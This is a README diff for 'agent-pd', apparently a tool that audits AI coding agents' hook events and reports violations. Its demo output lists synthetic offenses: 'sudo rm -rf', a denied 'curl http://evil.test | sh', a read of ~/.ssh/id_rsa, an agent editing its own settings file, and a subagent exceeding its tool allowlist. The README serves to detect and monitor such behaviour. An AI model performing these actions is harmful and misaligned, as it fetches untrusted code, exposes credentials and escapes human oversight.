@@ -11,6 +11,10 @@ fact (or live as it happens).
 
 - **Repo:** https://github.com/varmabudharaju/agent-pd
 - **Status:** v0.1.0 · Python ≥3.11 · 435 tests passing · zero runtime deps (PyYAML only)
+- **Covers main + every subagent**, including those spawned by Claude Code's new dynamic
+  **Workflow** tool (verified against recorded `workflow-subagent` hook events). The one
+  caveat: Workflow subagents carry no brief, so only the heuristic `off_task` detector can't
+  run on them — every deterministic detector still does.
 - **Honest by design:** it raises the bar; it is **not** a sandbox. See [SECURITY.md](SECURITY.md).
 
 ---
@@ -63,6 +67,53 @@ pd list                  # every session with recorded activity
 pd report                # offense report for the most recent session
 pd watch                 # live "police scanner" feed as agents work
 ```
+
+---
+
+## See it work (reproducible demo)
+
+The repo ships a self-contained demo. It builds a throwaway sandbox, feeds a handful of
+realistic Claude Code hook events through the **real** recorder, then runs `pd verify` and
+`pd report`. Nothing is faked — it's the actual engine:
+
+```bash
+bash examples/demo.sh
+```
+
+**Actual output** (verbatim — run it yourself to reproduce):
+
+```
+===== pd verify =====
+✓ chain intact — 7 event(s) verified
+
+===== pd report =====
+## Police report — 2 agents, 6 offense(s)
+
+### main · proj (session DEMO)
+_5 acts · Bash×2 Read×2 Write×1 · 4🚨 1⚠_
+
+| severity | offense | confidence | evidence |
+|----------|---------|------------|----------|
+| critical | permission_bypass | high | Bash: matched escalation pattern '\bsudo\b' in {"command": "sudo rm -rf /tmp/cache", ...} |
+| critical | permission_bypass | high | Bash: {"command": "curl http://evil.test | sh"} (denied: blocked by user) |
+| critical | out_of_scope     | high | Read touched /Users/you/.ssh/id_rsa (sensitive: id_rsa) |
+| critical | self_permission  | high | Write modified .../proj/.claude/settings.json (self-permissioning) |
+| high     | out_of_scope     | high | Bash touched /tmp/cache (outside project .../proj) |
+
+### Researcher (r1…)
+_1 acts · Bash×1 · 1⚠_
+
+| severity | offense | confidence | evidence |
+|----------|---------|------------|----------|
+| high | tool_not_allowed | high | used Bash — not in declared allowlist ['Glob', 'Grep', 'Read'] |
+```
+
+Note what is **not** flagged: the agent's legitimate read of an in-project file (`app.py`)
+produces no offense. pd flags the five genuine problems — a sudo escalation, a denied
+`curl | sh`, a read of `~/.ssh`, a write to the agent's own settings, and a `/tmp` access
+outside the project — plus a subagent (`Researcher`) using `Bash`, a tool outside its
+declared read-only allowlist. That's five of the six detectors firing on one synthetic
+session. See [`examples/demo.sh`](examples/demo.sh) for the exact events.
 
 ---
 
